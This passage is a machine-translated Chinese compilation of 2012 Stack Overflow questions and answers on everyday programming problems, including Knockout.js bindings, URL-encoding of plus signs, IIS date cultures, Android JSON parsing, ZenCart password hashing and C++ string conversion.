这是模拟器的怪癖/错误吗？或者这是否也发生在真正的平板电脑上？（我没有要检查的）

# javascript - 在 knockout.js 中的 ko.applyBindings 之后向模型添加可观察属性

> ID：10270902
> 
> 赞同：5
> 
> 时间：2012-04-22T18:38:15.830
> 
> 标签：javascript, knockout.js

例如

```
function Model(){};
var model = new Model();
ko.applyBinding(model);

model.name = ko.observable('john'); 
```

我知道代码不起作用，但有可能让它起作用吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-16T21:05:42.543

我能够通过使用 cleanNode 然后重新应用绑定来完成此操作。

```
function Model(){};
var model = new Model();
ko.applyBindings(model);

model.name = ko.observable('john');

var myDiv = $('#myDiv')[0];
ko.cleanNode(myDiv);
ko.applyBindings(model, myDiv);

<div id="myDiv">
    <span data-bind="text: name"></span>
</div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-28T07:14:32.023

一个可能的解决方案是绑定到局部视图，例如：

```
<div id="viewOne">
  <input data-bind="value: name" />
</div>

<div id="viewTwo">
  <input data-bind="value: name" />
</div>

<script type="text/javascript">
  var viewModelA = {
     name: ko.observable("John")
  };

  var viewModelB = {
     name: ko.observable("Doe")
  };

  ko.applyBindings(viewModelA, document.getElementById("viewOne"));
  ko.applyBindings(viewModelB, document.getElementById("viewTwo"));
</script> 
```

因此，在您的情况下，添加新属性后，您只能在需要新数据的视图部分再次应用绑定。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T19:54:59.873

您可能需要`ko.applyBindings`再次致电。我不确定它是否会起作用。如果没有，您可能需要查看 KnockoutJS 代码以找出`applyBindings`功能，然后找出您需要调用的函数以部分应用于您的新绑定。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T15:09:37.663

这应该能够让 applyBindings 函数只添加一个 div。目前在我自己的应用程序中自己尝试。不过到目前为止还没有太多运气。不知道它在您的应用程序中会如何反应。

```
ko.applyBindings(model, document.getElementById('#yourdiv')); 
```

仅使用模型调用 applyBindings 以将其绑定以在对象上创建其他绑定。不建议这样做。

```
function Model(){};
var model = new Model();
model.name = ko.observable('john');
ko.applyBindings(model);

model.street = ko.observable('stationstreet');
ko.applyBindings(model); 
```

后者将在街道对象上创建单个绑定，但是将在名称对象上创建第二个绑定。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-08-05T13:22:12.780

无需再次调用 ko.applyBindings。很可能在您的 html 代码之前调用您的绑定代码。如果您将 applyBinding 移动到文档准备就绪，一切都会好起来的！

对于 jQuery：

```
$(function () {
    ko.applyBindings(viewModel);
}); 
```

# shell - 计算模型运行的 ID

> ID：10270904
> 
> 赞同：0
> 
> 时间：2012-04-22T18:38:24.447
> 
> 标签：shell, math, pbs

我正在 PBS 系统上运行一些阵列作业（尽管希望不需要 PBS 系统的知识来回答我的问题！）。我有 24 次运行，但我想将它们分成 5 个子作业，所以我需要运行我的脚本 120 次。

在给出 PBS 选项后`-t 1-120`，我可以使用`$PBS_ARRAYID`. 但是，我想创建一些输出文件。最好这些输出文件使用只有 24 次运行时的 ID 以及子运行标识符（例如 output-1a.txt、output-1b.txt ... output-1e。 txt，输出 2a.txt）。

因此，我需要一种计算方法来获取 ID（在 1-24 范围内）以及子运行标识符（可能在一组 if 语句中），它可以在 shell 脚本中使用. 不幸的是，我的数学和 Unix 知识都不足以解决这个问题。我假设我需要与基于当前`$PBS_ARRAYID`相对于 120 或 24 的商/余数有关，但据我所知……

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:53:46.970

你只需要一点模块化的划分。在 Ruby 中对此的快速模拟是：

`p = Array.new; (1..120).each {|i| p[i] = "Run #{1+(i/5)}-#{((i%5)+96).chr}" }`

这只是说运行应该从 1 开始并在每个新的五个部分之后递增，并且尾随子运行应该是由 96 表示的 ascii 字符加上子运行的位置（例如，97 == '一种'）。

这是在 Bash 中：

```
#!/bin/bash

chr() {
  local tmp
  [ ${1} -lt 256 ] || return 1
  printf -v tmp '%03o' "$1"
  printf \\"$tmp" 
```

}

```
for ((i = 0; i < ${#ARP[*]}; i++))
do
    charcode=$((($i % 5)+97))
    charachter=$(chr "$charcode")
    echo "Filename: output-$((($i/5)+1))$charachter"
done 
```

我只是使用 ARP 作为数组的名称，但您显然可以替换它。祝你好运！

# jquery - 将按钮添加到表格页脚

> ID：10270906
> 
> 赞同：2
> 
> 时间：2012-04-22T18:38:31.320
> 
> 标签：jquery, datatables

我正在寻找一种方法，可以将“添加新”按钮添加到我的数据表页脚区域，以便在单击时将用户发送到添加新表单。我查看了数据表网站，不确定是否应该使用它。

[http://datatables.net/extras/tabletools/](http://datatables.net/extras/tabletools/)

对此还有其他想法吗？

```
var oTable = $('#users').dataTable({
    "bAutoWidth": false,
    "aoColumnDefs": [
        { "sWidth": "60px", "aTargets": [ 0, -1 ] },
        { "bSortable": false, "aTargets": [ -1 ] },
        { "sClass": "center", "aTargets": [ 0, -1 ] }
    ]
} ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T13:15:30.437

你不应该需要 TableTools。

在数据表中，您可以设置`sDOM`指定表的 DOM 布局的属性。[您可以在此处](http://datatables.net/ref#sdom)阅读有关它的更多信息，但提出它的主要目的是它允许您指定一个自定义`div`放置在您的页脚中。然后，您可以使用 jQuery 将您的按钮附加到该 div 或类似的东西。此外，CSS 应该可以很好地在页脚中定位该元素。

[这是有关 Datatables DOM 设置的更多信息](http://datatables.net/examples/basic_init/dom.html)

[这是 Datatables 论坛中的一个很好的问题，可能会帮助您](http://datatables.net/forums/discussion/3914/adding-buttons-to-header-or-footer/p1)

祝你好运！

**更新：**我刚刚去了您的网站并查看了您的数据表设置。因为您使用的是模板，所以他们提供的数据表代码在某种程度上已经被混改了——这反过来意味着您可能在 datatables.net 支持站点中看到的某些“默认值”无法应用。他们肯定改变了`sDom`默认值。这是他们正在使用的...：

```
'<"top"lf<"clear">>rt<"actions"<"actions-left"i><"actions-right"p>>' 
```

看起来“动作”是他们的页脚`div`。简单的方法是通过动态添加按钮`$(selector).append()`。如果您需要帮助，我会访问 jQuery 站点。

再次 - 祝你好运！

**更新2：**回应您的评论：

> 那么选择器会是什么？

您的选择器将是`'#actions'`. 但同样——如果你不熟悉`$`上面的语法，你可以通过阅读[jQuery](http://docs.jquery.com/Main_Page)来帮自己一个忙。`sDom`如果您已经熟悉 jQuery 并且只是在寻找要使用的选择器 ID，我深表歉意（在这种情况下，以供将来参考 - datatables参数中引号中的任何内容都将是`div`您可以在选择器中使用的 ID ）。

# java - POST 方法替换 '+' 字符

> ID：10270911
> 
> 赞同：3
> 
> 时间：2012-04-22T18:40:08.997
> 
> 标签：java, jsp, servlets, post

嘿。我正在使用 POST 方法将一些信息从 JSP 发送到 Servlet。我不明白为什么当我通过 POST 方法发送一个“+”字符时，它将被替换为一个空格字符。示例：当我键入以下字符串时：4+5 -> Servlet 将返回 4 5; 它取代了所有的“+”号。我该如何解决这个问题？我真的需要“+”字符可见，因为之后我需要评估表达式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:46:13.567

表单变量通过 URL 编码发送。“+”加号是（一个）空格的 URL 编码。

另请参阅： [AJAX POST 和加号 (+) -- 如何编码？](https://stackoverflow.com/questions/1373414/ajax-post-and-plus-sign-how-to-encode)

如果要发送文字加号，则需要通过 Javascript 或硬编码的“%2B”对其进行 URL 编码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:46:24.017

`URLEncode`在将数据发送到服务器之前，您需要先处理数据。服务器正在尝试解码未编码的数据——结果是`+`解码为空格。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T18:46:31.913

servlet 显然期望数据以 URL 编码形式到达，如[W3 文档中关于 HTTP 表单提交](http://www.w3.org/TR/html401/interact/forms.html#h-17.13.3.3)的描述。您需要更改 POST 的内容类型或（更好地）对您发送的数据进行编码。您可以将“+”符号编码为“%2B”。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-22T18:47:14.993

在对 URL 进行编码时，该`+`字符表示一个空格。如果您需要在 URL 中使用此字符，则必须像这样对其进行转义：

```
4+5 
```

变成

```
4%2B5 
```

# c# - 字符串在 IIS 上未被识别为有效的日期时间错误

> ID：10270914
> 
> 赞同：1
> 
> 时间：2012-04-22T18:40:34.940
> 
> 标签：c#, asp.net, visual-studio-2010

问候人们......我开发了一个网络......在部署之前一切正常......我的问题是 - 为什么会出现这个错误？因为如果我在 Visual Studio Server 上运行 Web，一切都很好……但是当我在 IIS 服务器上部署和运行它时，突然出现这个错误……为什么是人？这里真的需要一些帮助..

```
string tarikh = Convert.ToDateTime(txtTarikh.Text).ToString("yyyy-MM-dd"); 
```

该行是导致错误的原因..提前感谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-11-16T10:29:27.727

对于这个问题，你必须去 IIS

转到 IIS -> 选择您配置的网站 -> 单击**.NET 全球化**

从 .NET 全球化中，选择**Culture**和**UI- Culture** as **English (United State) (en – US)**

通过 windows 命令提示符运行命令作为 iisreset 重新启动 IIS

检查应用程序是否给出相同的问题

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T18:46:26.250

服务器端默认文化可能与您在开发中使用的文化不同。

无论如何，您希望日期采用什么格式？您应该使用[`DateTime.TryParseExact`](http://msdn.microsoft.com/en-us/library/system.datetime.tryparseexact.aspx)或*至少*使用[`DateTime.TryParse`](http://msdn.microsoft.com/en-us/library/system.datetime.tryparse.aspx)指定适当的`CultureInfo`. （例如，用户的文化。）

同样，我建议您提供适当`CultureInfo`的 to `ToString`-mably `CultureInfo.InvariantCulture`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-22T18:46:32.257

您的开发机器和 Web 服务器上有不同的“区域设置”。

您可以尝试使用重载版本 Convert.ToDateTime(string, IFormatProvider) 并指定您希望日期采用的格式，而不是调用 Convert.ToDateTime(string)。

我们中的一些人认为今天的日期是“2012-04-22”，而其他人则认为它是“4/22/2012”等等......

编辑：只需执行以下操作：

```
var  ci = new CultureInfo("xx-XX");
var dateTime = Convert.ToDateTime(txtTarikh.Text, ci); 
```

其中 xx-XX 是您要使用的文化代码。在这里查找：http: [//sharpertutorials.com/list-of-culture-codes/](http://sharpertutorials.com/list-of-culture-codes/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-22T18:46:06.437

因为您从 txtTarikh.Text 获得的日期不会被解析为日期。可能在您的本地计算机上，您的区域设置与您的服务器不同。添加日志并打印 txtTarikh.Text 以查看在您的服务器和本地计算机上返回的内容。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-04-26T08:13:15.373

[![在此处输入图像描述](../Images/0866cf1b1dd5bc22fb775a4e18e8d9fa.png)](https://i.stack.imgur.com/xaBI2.png)

通过在 IIS 中设置 .net 全球化设置解决了问题

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-07-25T15:13:31.103

```
<system.web>
    <globalization requestEncoding="utf-8"  responseEncoding="utf-8" fileEncoding="utf-8" culture="en-US" uiCulture="en-US" />
  </system.web> 
```

在 web.config 中更改这些行并再次发布它。它对我有用。

# asp-classic - 有人可以解释以下代码的作用吗？

> ID：10270916
> 
> 赞同：1
> 
> 时间：2012-04-22T18:40:41.180
> 
> 标签：asp-classic

我目前正在开发一个用经典 asp 编写的项目。我以前使用过这种语言，但我对它生疏了。

在该代码中，我看到以下函数调用： `Result = SwapOEMPart(sItem)`

当我查看 SwapOEMPart 时，我看到了这个：

```
function SwapOEMPart(oemPart)
  // Do a bunch of stuff
  oemPart = objRS("CCIPartNo") <-- this is the result of the stuff
end function 
```

那有什么作用？它是否用 oemPart 的值填充 Result？它是否改变了 sItem 的值（类似于通过引用传递）？或者也许它是完全不同的东西。

我熟悉通过将函数名称设置为您要返回的值来从 asp 函数返回数据，但在这种情况下，他们正在更改他们传入的参数的值，然后只是结束函数。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T19:08:07.393

根据您提供的代码，我将假设`objRS`是一个`adodb.recordset`，如果是这种情况，`CCIPartNo`是记录集中的一列，您的所有代码正在做的就是将该列的值写入`eomPart`变量 -没有`eomPart`被引用`byref`为函数声明，但如果您在 vbscript（不是 .net）中，这被假定为默认值，所以**这几乎就像列的值被传递回 eomPart & 因为 eomPart 是对您的 sItem 值的引用例如，sItem 的实际值会发生变化。

[http://msdn.microsoft.com/en-us/library/ee478101%28VS.84%29.aspx](http://msdn.microsoft.com/en-us/library/ee478101%28VS.84%29.aspx)

# javascript - 有没有办法使用 html5 canvas 的 fillText 方法将文本放入不可见的文本框中？

> ID：10270917
> 
> 赞同：0
> 
> 时间：2012-04-22T18:41:20.743
> 
> 标签：javascript, html, text

我正在制作一个 HTML5 游戏，我需要一种以文本方式告知玩家事情的方法。我想使用 fillText 方法将文本放入此框中：

![在此处输入图像描述](../Images/d3a015fbdab85d904a6cc7c20fdaf580.png)

现在，我只知道如何在一行中呈现文本，但这显然还不够，因为需要有换行符才能使文本适合。有没有办法快速做到这一点，还是我必须自己编码？

这是消息在游戏中的样子： ![在此处输入图像描述](../Images/eddbebb2206df283b09021f43790d99a.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T19:02:41.140

查看[规范](http://www.whatwg.org/specs/web-apps/current-work/multipage/the-canvas-element.html#drawing-text-to-the-canvas)，如果您只想使用画布，则必须自己做。

为此，您需要使用`measureText`来获取文本的大小并手动拆分它。但这似乎很麻烦。

我发现另一个更优雅的解决方案是使用 HTML 覆盖。用于此的 HTML 可能如下所示：

```
<div id="outer" syle="position:relative">
   <canvas id='myCanvas'/>
   <div id="textualDiv" syle="position:absolute"></div>
</div> 
```

`textualDiv`然后，您将根据需要进行定位，并在需要时进行填充。之后，您只需将其隐藏即可。并在需要时再次显示。

# apache-flex - flex（电子邮件字段）中的浏览器自动完成支持？

> ID：10270918
> 
> 赞同：1
> 
> 时间：2012-04-22T18:41:23.413
> 
> 标签：apache-flex, email, browser, autocomplete

Flex 是否支持浏览器的自动完成功能？

我希望它向我的用户建议他们在电子邮件字段中使用过的电子邮件，就像在 html 中所做的那样（输入类型=“电子邮件”自动完成=“打开”）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:49:05.533

我认为您无法阅读浏览器的自动完成列表，但您可以在 Flex 中实现自己的自动完成组件，试试[http://hillelcoren.com/flex-autocomplete/ ！](http://hillelcoren.com/flex-autocomplete/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T19:05:32.630

> Flex 是否支持浏览器的自动完成功能？

您将无法访问 Flex 应用程序内的任何浏览器特定数据。Flex 没有内置自动完成组件；但也有一些。

出于显而易见的原因，我更喜欢我们的；所以我建议查看[Flextras AutoCompleteComboBox](https://www.flextras.com/index.cfm?event=ProductHome&productID=19)组件，它有一个 MX 版本、一个 Spark 版本，可以在移动设备上运行，并且可以免费用于生产使用。

# asp.net-mvc-3 - 尝试将字符串解析为浮点数时出现 FormatException

> ID：10270920
> 
> 赞同：0
> 
> 时间：2012-04-22T18:41:36.547
> 
> 标签：asp.net-mvc-3

我必须将浮点数存储在字符串中。

```
Longitude   "15.628351800000019"    string
Latitude    "60.61594090000001" string 
```

我正在尝试将这些解析为像这样的浮点数

```
float.Parse(Longitude) 
```

当我这样做时，我遇到了 FormatException。问题可能是什么？ASP.Net MVC 3 C#

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:51:09.443

尝试

```
float lon = float.Parse(Longitude, System.Globalization.NumberStyles.Any); 
```

# android - 按顺序下载带有 JSON 的网页？

> ID：10270922
> 
> 赞同：0
> 
> 时间：2012-04-22T18:41:57.747
> 
> 标签：android, json

我正在尝试从该网站获取所有货币汇率并在我的应用程序中进行处理。这是网站：[https ://raw.github.com/currencybot/open-exchange-rates/master/latest.json](https://raw.github.com/currencybot/open-exchange-rates/master/latest.json)

我正在使用这个类来获取所有的货币汇率，但问题是它以随机顺序获取它，因为 Iterator keys = ratesObj.key();

我该如何解决这个问题，以便它按顺序获得所有货币汇率？

这是代码：

```
private class DownloadWebPageTask extends AsyncTask<String, Void, ArrayList<Double>>
{
    protected ArrayList<Double> doInBackground(String... urls)
    {
        ArrayList<Double> response = new ArrayList<Double>();
        for (String url : urls)
        {
            DefaultHttpClient client = new DefaultHttpClient();
            HttpGet httpGet = new HttpGet(url);
            try
            {
                HttpResponse execute = client.execute(httpGet);
                InputStream content = execute.getEntity().getContent();
                InputStreamReader isr = new InputStreamReader(content);
                StringBuilder sb = new StringBuilder();
                char[] buffer = new char[1024];
                while (isr.read(buffer) != -1)
                {
                    sb.append(buffer);
                }
                JSONObject jobj = new JSONObject(sb.toString());
                JSONObject ratesObj = jobj.getJSONObject("rates");
                Iterator<String> keys = ratesObj.keys();
                while (keys.hasNext())
                {
                    response.add(Double.parseDouble(ratesObj.getString(keys.next())));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return response;
    }
    @Override
    protected void onPostExecute(ArrayList<Double> result)
    { 
        currency_values = result;
    }
} 
```

感谢大家的帮助！对此，我真的非常感激。

*更新*：这是现在的代码。

```
try
            {
                HttpResponse execute = client.execute(httpGet);
                InputStream content = execute.getEntity().getContent();
                String s = EntityUtils.toString(execute.getEntity());
                JSONObject jobj = new JSONObject(s);
                JSONObject ratesObj = jobj.getJSONObject("rates");
                Iterator<String> keys = ratesObj.keys();
                while (keys.hasNext())
                {
                    response.add(Double.parseDouble(ratesObj.getString(keys.next())));
                }
            } catch (Exception e) {
                e.printStackTrace();
            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T19:28:17.697

这是实现我在评论中建议的一种方法，使用 a`SortedMap<String, Double>`将三字母货币代码映射到汇率，同时按货币代码按字母顺序排列：

```
 protected SortedMap<String, Double> doInBackground(String... urls) {
    SortedMap<String, Double> result = new TreeMap<String, Double>();

    HttpClient client = new DefaultHttpClient();
    for (String url : urls) {
      try {
        HttpGet request = new HttpGet(url);
        HttpResponse response = client.execute(request);
        String jsonString = EntityUtils.toString(response.getEntity());

        JSONObject json = new JSONObject(jsonString);
        JSONObject rates = json.getJSONObject("rates");
        Iterator<String> currencyCodes = rates.keys();
        while (currencyCodes.hasNext()) {
          String currencyCode = currencyCodes.next();
          double rate = rates.getDouble(currencyCode);
          result.put(currencyCode, rate);
        }
      } catch (Exception ex) {
        Log.e(TAG, "Failed to download exchange rates from " + url, ex);
      }
    }
    return result;
  } 
```

# security - Sql Server 中的 zencart 密码是如何加密的？

> ID：10270925
> 
> 赞同：2
> 
> 时间：2012-04-22T18:42:40.123
> 
> 标签：security, zen-cart, password-storage

我已经在我的网络服务器上设置了一个 zencart，并且管理功能的密码在与 zencart 关联的 sql 数据库中被加密（或以某种方式混淆） - 谁能告诉我这种加密的程度？我想知道设法获得数据库的人是否能够访问数据库密码部分中的数据，或者我是否会受到保护，以防止数据的特定部分通过其加密公开。

如果它是加密的，它是如何加密的，解密的难易程度如何？

这是一个默认的禅宗购物车设置。

亲切的问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:58:54.277

ZenCart 中的密码存储为为 salt + 密码创建的 MD5 哈希。SQL 数据库中存储的格式是 MD5Hash:Salt。

在创建哈希之前对密码进行加盐可防止有权访问用户表的用户在彩虹表的帮助下对密码进行反向工程。所以，你是安全的，但如果使用 SHA-2 算法可能会更好。

使用 PHP，您可以使用以下代码创建用于存储的数据：

> $hashedPassword = md5($salt.$password).':'.$salt;

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-24T10:14:20.413

较新版本的 ZenCart 使用带有随机盐的 SHA256 散列算法（尽管由于某些未知原因，该变量被称为“密码”）：

```
function zen_encrypt_password_new($plain)
{
  $password = '';
  for($i = 0; $i < 40; $i ++) {
    $password .= zen_rand();
  }
  $salt = hash('sha256', $password);
  $password = hash('sha256', $salt . $plain) . ':' . $salt;
  return $password;
} 
```

（从版本 1.5.4 - `includes/functions/password_funcs.php`）

# android - Android - 标题内容长度等于-1

> ID：10270930
> 
> 赞同：0
> 
> 时间：2012-04-22T18:43:47.857
> 
> 标签：android, file, download, size, content-length

我正在我的 android 应用程序中下载一个文件，我想显示一个进度条。我需要知道使用此方法的总文件大小：[这里](http://developer.android.com/reference/java/net/URLConnection.html#getContentLength%28%29)。问题是我总是得到-1，尽管它设置在服务器上并且我可以从我的计算机上看到它。

这是代码：

```
URL url = new URL(fileUrl);
URLConnection ucon = url.openConnection();
ucon.connect();
int length = ucon.getContentLength(); 
```

问题是什么 ？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-22T18:45:49.723

这与 Android 无关，很可能不是从服务器发送的。请使用任何嗅探工具确保内容长度标头存在。

# android - Android - 重复背景并将白色应用于透明渐变

> ID：10270931
> 
> 赞同：1
> 
> 时间：2012-04-22T18:43:50.553
> 
> 标签：android, background, gradient, repeat

我想创建一个背景，其中包含水平和垂直重复的图像。在整个背景之上，我想应用从白色到透明的渐变，覆盖背景的一半。现在，我想知道我是否可以用**style**做到这一点。这是因为我收到了这个警告：

```
"Possible overdraw: Root element paints background @drawable/background with a 
theme that also paints a background (inferred theme is @android:style/Theme)" 
```

看起来背景应用了两次，一次是默认主题（主题），然后是我的布局、可绘制元素或其他。

所以，我的问题是：如何通过创建新主题或创建可绘制并禁用默认主题背景来做到这一点，新主题背景会被新主题透支？

谢谢大家！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:58:33.023

假设您要为所有窗口设置背景，样式定义如下：

```
<style name="MyTheme" parent="@android:style/Theme.Holo">
    <item name="android:windowBackground">@drawable/activity_background</item>
</style> 
```

如果您想为特定视图执行此操作，通常必须将“android:background”属性设置为您的可绘制对象。

要在其上具有渐变的位图，必须使用这样的图层列表定义您的可绘制对象：

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android" >

<item>
    <bitmap
        android:dither="true"
        android:src="@drawable/dialog_background_img"
        android:tileMode="repeat" >
    </bitmap>
</item>
<item>
   <shape>
      <gradient
        android:angle="90"
        android:endColor="#66ff0000"
        android:startColor="#5500ff00" />
   </shape>
</item>

</layer-list> 
```

# android - 无法从 ListPreference 中获取值

> ID：10270935
> 
> 赞同：0
> 
> 时间：2012-04-22T18:44:07.063
> 
> 标签：android, sharedpreferences, android-preferences, listpreference

我无法从此类中的 sharedpreferences 中获得价值。getDefaultSharedPreferences 给出错误“PreferenceManager 类型中的方法 getDefaultSharedPreferences(Context) 不适用于参数 (HandlingXMLStuff)”

我可以从我的主类中获取值，但我不能将它传递给下面显示的类。

```
public class HandlingXMLStuff extends DefaultHandler {
String Units;

private XMLDataCollected info = new XMLDataCollected();

public String getInformation() {
    return info.dataToString();
}

@Override
public void startElement(String uri, String localName, String qName,
        Attributes attributes) throws SAXException {

    SharedPreferences prefs = PreferenceManager
            .getDefaultSharedPreferences(this);
    String unit = prefs.getString("unitsofmeasure", "Fahrenheit");

    Log.d("HandlingXMLStuff", "test" + unit);
    // if (Units == "Farenheit") {
    if (localName.equals("city")) {
        String city = attributes.getValue("data");
        info.setCity(city);
        Log.d("DeskClockActivity", "test" + city);

    } else if (localName.equals("temp_f")) {
        String t = attributes.getValue("data");
        int temp = Integer.parseInt(t);
        info.setTemp(temp);
    }
    /*
     * }/* else if (unit == "C") { if (localName.equals("city")) { String
     * city = attributes.getValue("data"); info.setCity(city); } else if
     * (localName.equals("temp_c")) { String t =
     * attributes.getValue("data"); int temp = Integer.parseInt(t);
     * info.setTemp(temp); } }
     */
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:52:17.300

getDefaultSharedPreferences 采用上下文参数，而 DefaultHandler 类不是上下文。

# javascript - 如何在单击该图像的 onclick 事件上获取图像源路径

> ID：10270937
> 
> 赞同：3
> 
> 时间：2012-04-22T18:44:22.677
> 
> 标签：javascript

当图像的 onclick 事件被触发时，我需要获取图像源。

我尝试使用 document.getElementById("example").src; ，但浏览器上的控制台说

**未捕获的类型错误：无法读取 null 的属性“src”**

```
<html>
<head>
<script type="text/javascript">
function changeIt()
{
var name = document.getElementById("myimage").src;
alert(name);
}
</script>
</head>
<body>
<img onclick="changeIt()" src='em1.gif' name='example' border='0' />
<img onclick="changeIt()" src='em2.gif' name='example' border='0' />
<img onclick="changeIt()" src='em3.gif' name='example' border='0' />
<img onclick="changeIt()" src='em4.gif' name='example' border='0' />
<img onclick="changeIt()" src='em5.gif' name='example' border='0' />
</body>
</html> 
```

**更新部分。**

实际来源是，在 AJAX 响应中，我将从文件夹中获取图像路径，为此我需要动态创建图像并将它们添加到 div 中。

这是实际代码

```
outputdata.forEach(function (element) {
                   content = $("<div><a href='something'><img onclick='changeIt()' src='" + element + "'   /></a></div>");
                   content.addClass('content');
                   container.append(content);
                   $("#fp_thumbScroller").append(container);
                });
            } 
```

所以我没有创建 ID，认为不同的图像使用相同的 ID 是不合适的。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-22T18:50:19.940

html:

```
<img onclick="changeIt(this.src)" src='em1.gif' name='example' border='0' /> 
```

js：

```
function changeIt(_src){
    alert(_src);
}​ 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-22T18:53:42.280

我会将实际元素引用（this）作为参数传递，以便您可以更改图像源或您想要更改的任何内容。

HTML：

```
<img onclick="changeIt(this)" src='em3.gif' name='example' border='0' /> 
```

Javascript（确保它在该区域）：

```
function changeIt(img)
{
    var name = img.src;
    alert(name);
} 
```

这是一个[小提琴](http://jsfiddle.net/7CwvL/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T18:53:07.160

您的 html 中是否有任何 id 为“myimage”的 img 标签？在引用之前，您必须确保有一个 id 为“myimage”的 img 元素！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-22T18:46:10.790

那是因为您的所有图像都没有 ID：

```
<img id="myImage" onclick="changeIt()" src='em1.gif' name='example' border='0' /> 
```

# mysql - 我是否需要在 MySQL 中添加一个约束以明确不允许空值出现在非空列中？

> ID：10270943
> 
> 赞同：0
> 
> 时间：2012-04-22T18:45:40.227
> 
> 标签：mysql, insert, notnull

我写了架构：

```
CREATE TABLE user
(
user_id INT UNSIGNED AUTO_INCREMENT NOT NULL,
fname VARCHAR(20) NOT NULL,
lname VARCHAR(20) NOT NULL,
email VARCHAR(30) NOT NULL,
password VARCHAR(60) NOT NULL,
gender ENUM('M', 'F'),
CONSTRAINT pk_user_id PRIMARY KEY (user_id) 
```

)

但是当只插入两个值时，假设用户的名字和姓氏，电子邮件和密码留空，这意味着 not null 没有按预期工作。当我显示它们时，我确实收到了 2 个警告，但行为与预期不符。我是否必须专门制定约束以使插入失败以确保这种情况永远不会发生？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:48:13.703

不幸的是，mysql 不支持`CHECK`约束。

出于兼容性原因，它们在 mysql 中是“有效语法”，因此您可以对它们进行编码，并且创建表 SQL 将执行 OK，但此后它们将被忽略。

# php - 在日期错误前添加 0

> ID：10270944
> 
> 赞同：0
> 
> 时间：2012-04-22T18:45:40.767
> 
> 标签：php, arrays, string

我想在单个数字前面添加 0。

```
for($i_y=1950; $i<=2012; $i++) $years[]=$i_y;
for($i_m=1; $i<=12; $i++) $months[]=$i_m;
for($i_d=1; $i<=31; $i++) $days[]=$i_d; 
```

试过了

```
for($i_y=1950; $i<=2012; $i++) $years[]=$i_y;
for($i_m=01; $i<=12; $i++) $months[]=$i_m;
for($i_d=01; $i<=31; $i++) $days[]=$i_d; 
```

没那么简单，正确的方法是什么？

这是一个选择选项

**例子**

```
for($i=1; $i<=50; $i++)
$months=$i;

echo '<select name="month" select id="month">';
echo '<option value="">' . __("0" ) . '</option>';
foreach($months as $month){
$selected = '';
echo '<option value="' . $month . '" ' . $selected . '>' . $month . '</option>';
                    }
echo '</select>'; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T18:47:16.310

使用`str_pad`：

```
$x = "1";
echo $x; // will output "1"
$y = str_pad($x, 2, "0", STR_PAD_LEFT);
echo $y; // will output "01" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T19:09:33.113

如果您尝试格式化像“2012-04-01”这样的日期，您可以这样做[`sprintf()`](http://us3.php.net/manual/en/function.sprintf.php)：

```
 $formatted_date = sprintf("%04d-%02d-%02d", $year, $month, $day); 
```

# c++ - 如何在 C++ 中将字符串转换为整数？

> ID：10270946
> 
> 赞同：1
> 
> 时间：2012-04-22T18:45:52.880
> 
> 标签：c++, string, integer

到目前为止，这是我的代码：

```
 #include "stdafx.h"
 #include <iostream>
 #include <string>
 using namespace std;

 int main()
 {
 string exp;
 cout << "Enter a number and raise it to a power" << endl;
 cin >> exp;
 int num = exp[0];
 int pow = exp[2];

 cin.get();
 cin.ignore(256,'\n');
 } 
```

基本上，我正在尝试制作一个程序，您可以在其中输入“2^5”之类的内容，它会为您解决问题。到目前为止，我已经取了字符串的第一个和第三个值，并将它们称为“num”和“pow”。(Number, Power) 如果你尝试类似“cout << num;” 它会给你十进制的ASCII值。如何将其转换为小数？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:50:58.150

您可以直接读取`cin`整数变量：

```
int n;
std::cin >> n; 
```

但是您不能以这种方式输入看起来自然的表达式。

要阅读`2^5`，您可以使用`std::stringstream`：

```
int pos = exp.find('^');
int n;
std::stringstream ss;
if(pos != std::npos){
    ss << exp.substr(0, pos);
    ss >> n;
} 
```

和第二个变量类似。

此方法在 Boost 中实现为`boost::lexical_cast`.

更复杂的表达式需要构建解析器，我建议您阅读有关此主题的更多信息。

* * *

## 回答 #2

> 赞同：2
> 
